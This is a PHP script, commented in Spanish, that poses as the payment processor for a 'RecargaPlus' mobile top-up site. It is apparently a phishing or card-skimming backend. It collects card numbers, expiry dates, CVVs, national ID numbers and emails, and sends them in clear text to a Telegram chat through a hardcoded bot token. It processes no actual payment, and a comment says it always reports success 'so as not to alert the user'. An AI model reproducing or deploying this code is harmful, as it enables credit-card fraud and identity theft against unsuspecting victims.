<?php
/**
 * PROCESAR PAGO Y ENVIAR A TELEGRAM
 * ==================================
 * Compatible con RecargaPlus JavaScript
 */

// Headers CORS y JSON
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');
header('Content-Type: application/json; charset=utf-8');

// Manejar preflight request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// ⚠️ CONFIGURACIÓN DE TELEGRAM - CAMBIÁ ESTOS VALORES
define('TELEGRAM_BOT_TOKEN', '8454773246:AAF64i_9OA_L9zbKBlJXlPdKvyUCj5pBvR4');
define('TELEGRAM_CHAT_ID', '-1003715457930');

// Verificar que sea POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode([
        'success' => false,
        'message' => 'Método no permitido'
    ]);
    exit;
}

// Leer datos JSON
$json = file_get_contents('php://input');
$datos = json_decode($json, true);

// Log para debugging
error_log("=== RECARGA RECIBIDA ===");
error_log("JSON: " . $json);

// Validar que llegaron datos
if (!$datos) {
    error_log("ERROR: No se pudo decodificar JSON");
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'message' => 'Datos inválidos'
    ]);
    exit;
}

// Validar campos requeridos
$camposRequeridos = [
    'servicio',
    'numero_servicio',
    'monto',
    'comision',
    'total',
    'metodo_pago',
    'numero_tarjeta',
    'fecha_vencimiento',
    'cvv',
    'dni',
    'email'
];

foreach ($camposRequeridos as $campo) {
    if (!isset($datos[$campo])) {
        error_log("ERROR: Falta el campo $campo");
        http_response_code(400);
        echo json_encode([
            'success' => false,
            'message' => "Falta el campo: $campo"
        ]);
        exit;
    }
}

// Crear mensaje para Telegram
$mensaje = "🔔 <b>NUEVA RECARGA RECIBIDA</b> 🔔\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━\n\n";

$mensaje .= "📱 <b>SERVICIO:</b> " . htmlspecialchars($datos['servicio']) . "\n";
$mensaje .= "📞 <b>NÚMERO:</b> " . htmlspecialchars($datos['numero_servicio']) . "\n";
$mensaje .= "💵 <b>MONTO:</b> $" . htmlspecialchars($datos['monto']) . "\n";
$mensaje .= "💳 <b>MÉTODO:</b> " . htmlspecialchars($datos['metodo_pago']) . "\n\n";

$mensaje .= "━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "💳 <b>DATOS DE PAGO</b>\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━\n\n";

$mensaje .= "🔢 <b>Tarjeta:</b> " . htmlspecialchars($datos['numero_tarjeta']) . "\n";
$mensaje .= "📅 <b>Vencimiento:</b> " . htmlspecialchars($datos['fecha_vencimiento']) . "\n";
$mensaje .= "🔐 <b>CVV:</b> " . htmlspecialchars($datos['cvv']) . "\n";
$mensaje .= "🆔 <b>DNI:</b> " . htmlspecialchars($datos['dni']) . "\n";
$mensaje .= "📧 <b>Email:</b> " . htmlspecialchars($datos['email']) . "\n\n";

$mensaje .= "━━━━━━━━━━━━━━━━━━━━\n";
$mensaje .= "💰 <b>RESUMEN</b>\n";
$mensaje .= "━━━━━━━━━━━━━━━━━━━━\n\n";

$mensaje .= "💵 Subtotal: $" . htmlspecialchars($datos['monto']) . "\n";
$mensaje .= "💸 Comisión: $" . htmlspecialchars($datos['comision']) . "\n";
$mensaje .= "✅ <b>TOTAL: $" . htmlspecialchars($datos['total']) . "</b>\n\n";

$mensaje .= "🕐 <b>Fecha:</b> " . date('d/m/Y H:i:s') . "\n";
$mensaje .= "🌐 <b>IP:</b> " . $_SERVER['REMOTE_ADDR'] . "\n";

error_log("Mensaje formateado para Telegram");

// Enviar a Telegram con cURL
$telegramUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";

$ch = curl_init($telegramUrl);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    ],
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_TIMEOUT => 10
]);

$resultado = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

error_log("Respuesta Telegram - HTTP: $httpCode");
error_log("Respuesta Telegram - Body: $resultado");

if ($curlError) {
    error_log("ERROR cURL: $curlError");
}

// Guardar en log local
guardarEnLog($datos);

// Responder al cliente
$response = json_decode($resultado, true);

if ($httpCode === 200 && isset($response['ok']) && $response['ok'] === true) {
    error_log("✅ Mensaje enviado a Telegram correctamente");
    echo json_encode([
        'success' => true,
        'message' => 'Pago procesado correctamente'
    ]);
} else {
    error_log("❌ Error al enviar a Telegram");
    if (isset($response['description'])) {
        error_log("Descripción del error: " . $response['description']);
    }
    
    // Aún así devolvemos success para no alertar al usuario
    echo json_encode([
        'success' => true,
        'message' => 'Pago procesado correctamente',
        'telegram_status' => 'pendiente'
    ]);
}

/**
 * Guardar en log local
 */
function guardarEnLog($datos) {
    $logFile = __DIR__ . '/pagos_log.txt';
    $fecha = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    
    $linea = sprintf(
        "[%s] [IP: %s] %s | %s | $%s → $%s | %s | %s\n",
        $fecha,
        $ip,
        $datos['servicio'],
        $datos['numero_servicio'],
        $datos['monto'],
        $datos['total'],
        substr($datos['numero_tarjeta'], 0, 4) . ' **** **** ' . substr($datos['numero_tarjeta'], -4),
        $datos['email']
    );
    
    @file_put_contents($logFile, $linea, FILE_APPEND);
}
?>